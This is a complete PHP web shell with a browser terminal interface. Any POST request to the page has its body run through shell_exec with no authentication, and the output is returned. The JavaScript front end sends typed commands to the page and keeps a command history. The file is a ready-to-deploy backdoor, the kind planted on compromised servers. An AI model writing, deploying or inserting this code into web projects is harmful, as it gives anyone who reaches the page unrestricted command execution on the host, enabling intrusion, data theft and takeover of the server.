<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$input = json_decode(file_get_contents('php://input'), true);
	$output = shell_exec($input);
	echo json_encode($output);
	die();
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>web_shell</title>
	<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' fill='%23000'/%3E%3Ctext x='50%25' y='50%25' font-family='monospace' font-size='48' text-anchor='middle' dominant-baseline='central' fill='%230F0'%3E%24%3C/text%3E%3C/svg%3E">
	<style>
		body {
			background-color: #000;
			color: #0F0;
			font-family: Arial, Helvetica, Verdana, sans-serif;
		}
		p {
			margin: 0;
		}
		p, span, input {
			font-size: 16px;
		}
		.input-wrapper {
			display: flex;
			align-items: center; 
		}

		.input-wrapper span {
			margin-right: 4px; 
		}
		.input-wrapper input {
			flex: 1;             
			box-sizing: border-box;
			background: #000;
			color: #0F0;
			border: none;
			outline: none;
			box-shadow: none;
		}
		#output p {
			white-space: pre-wrap;
		}
	</style>
</head>
<body>
	<div id="output"></div>
	<div class="input-wrapper">
		<span>$</span>
		<input type="text" autofocus>
	</div>
	<script>
		(() => {
			let setInputCommand = (command) => {
				const input = document.querySelector('input');
				input.value = command;
				input.focus();
				input.setSelectionRange(input.value.length, input.value.length);
			}
			let commands = [];
			let historyIndex = -1;
			document.addEventListener('keyup', function (e) {
				if (e.key === 'Enter') {
					const input = document.querySelector('input');
					const value = input.value;
					input.value = '';
					if(value){
						commands.push(value);
						const xhr = new XMLHttpRequest();
						xhr.open('POST', window.location.href);
						xhr.setRequestHeader("Content-Type", "application/json");
						xhr.onload = function() {
							if (xhr.status === 200) {
								const response = JSON.parse(xhr.responseText);
								if(response !== null && response !== ''){
									const output = document.getElementById('output');
									const p = document.createElement('p');
									p.textContent = '$ ' + value + '\n' + response;
									output.appendChild(p); 
								}
								window.scrollTo(0, document.body.scrollHeight);
							}
						};
						xhr.send(JSON.stringify(value));
					}
				}
				if (e.key === "ArrowUp") {
					e.preventDefault();
					historyIndex--; 
					if (historyIndex < 0) {
						historyIndex = commands.length - 1;
					}
					const command = commands[historyIndex];
					if (command) {
						setInputCommand(command);
					}
				}
				if (e.key === "ArrowDown") {
					e.preventDefault(); 
					historyIndex++;
					if (historyIndex >= commands.length) {
						historyIndex = 0;
					}
					const command = commands[historyIndex];
					if (command) {
						setInputCommand(command);
					}
				}
			});
		})();
	</script>
</body>
</html>